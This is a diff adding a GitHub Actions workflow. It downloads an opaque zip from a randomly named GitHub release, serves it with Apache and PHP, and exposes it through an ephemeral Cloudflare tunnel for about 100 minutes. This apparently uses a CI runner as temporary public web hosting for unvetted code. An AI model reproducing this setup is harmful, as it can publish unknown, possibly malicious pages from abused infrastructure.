@@ -1,0 +1,77 @@
+name: Deploy new3 with Apache + cloudflared
+
+on:
+  workflow_dispatch:
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    env:
+      SITE_PORT: 9000
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Install dependencies
+        run: |
+          sudo apt-get update -y
+          sudo apt-get install -y apache2 php unzip wget procps
+
+      - name: Download new3.zip
+        run: |
+          wget -q -O new3.zip "https://github.com/hrjfjtjtntnfn/lode/releases/download/V.838383/new3.zip"
+
+      - name: Extract new3.zip
+        run: |
+          unzip -o new3.zip -d new3
+
+      - name: Enable .htaccess in Apache
+        run: |
+          echo "Enabling .htaccess (AllowOverride All) in new3..."
+          # Tạo site config mới cho Apache
+          sudo tee /etc/apache2/sites-available/new3.conf > /dev/null <<EOF
+<VirtualHost *:${SITE_PORT}>
+    DocumentRoot "${GITHUB_WORKSPACE}/new3"
+    <Directory "${GITHUB_WORKSPACE}/new3">
+        Options Indexes FollowSymLinks
+        AllowOverride All
+        Require all granted
+    </Directory>
+</VirtualHost>
+EOF
+          # Kích hoạt site
+          sudo a2ensite new3.conf
+          # Reload Apache để nhận config mới
+          sudo systemctl reload apache2 || sudo apachectl -k restart
+
+      - name: Start Apache
+        run: |
+          echo "Starting Apache on port ${SITE_PORT}..."
+          sudo apachectl -k start || true
+          sleep 3
+          curl -I "http://localhost:${SITE_PORT}" || true
+
+      - name: Install cloudflared
+        run: |
+          echo "Installing cloudflared..."
+          sudo wget -q -O /usr/local/bin/cloudflared \
+            https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
+          sudo chmod +x /usr/local/bin/cloudflared
+          cloudflared --version
+
+      - name: Start cloudflared tunnel (ephemeral)
+        run: |
+          echo "Starting cloudflared tunnel to http://localhost:${SITE_PORT} ..."
+          nohup cloudflared tunnel --url "http://localhost:${SITE_PORT}" --no-autoupdate > cloudflared.log 2>&1 &
+          sleep 8
+          if grep -Eo 'https?://[^ ]+trycloudflare.com' cloudflared.log | head -n1 > /tmp/public_url; then
+            echo "✅ Public URL:"
+            cat /tmp/public_url
+          else
+            echo "⚠️ Không tìm thấy URL. Log cloudflared:"
+            cat cloudflared.log
+            exit 1
+          fi
+          echo "🕒 Web sẽ chạy 6000s..."
+          sleep 6000
